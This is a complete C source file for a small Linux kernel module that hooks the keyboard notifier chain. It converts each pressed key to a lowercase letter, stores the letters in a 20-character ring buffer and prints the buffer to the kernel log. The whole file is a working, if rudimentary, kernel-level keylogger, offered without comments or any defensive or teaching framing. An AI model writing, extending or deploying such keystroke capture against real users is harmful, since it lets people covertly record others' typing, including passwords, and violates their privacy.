#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define BUFFER_SIZE 20

MODULE_LICENSE("GPL");

static int knb_callback(struct notifier_block *nblock, unsigned long code, void *_param);

static struct notifier_block kb_notifier_blk = {
	.notifier_call = knb_callback,
};

char buffer[BUFFER_SIZE+1];
int cur = 0;

int knb_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	char letter = 'a' + param->value - 64353;
	if(letter >= 'a' && letter <= 'z' && param->down == 1){
		buffer[cur++] = letter;
		cur %= BUFFER_SIZE;
	       	printk("callback %s\n", buffer);
	}
	return NOTIFY_OK;
}

static int __init my_init(void)
{
	printk("init\n");
	register_keyboard_notifier(&kb_notifier_blk);
	return 0;
}

static void __exit my_exit(void)
{
	printk("exit\n");
	unregister_keyboard_notifier(&kb_notifier_blk);
}

module_init(my_init);
module_exit(my_exit);
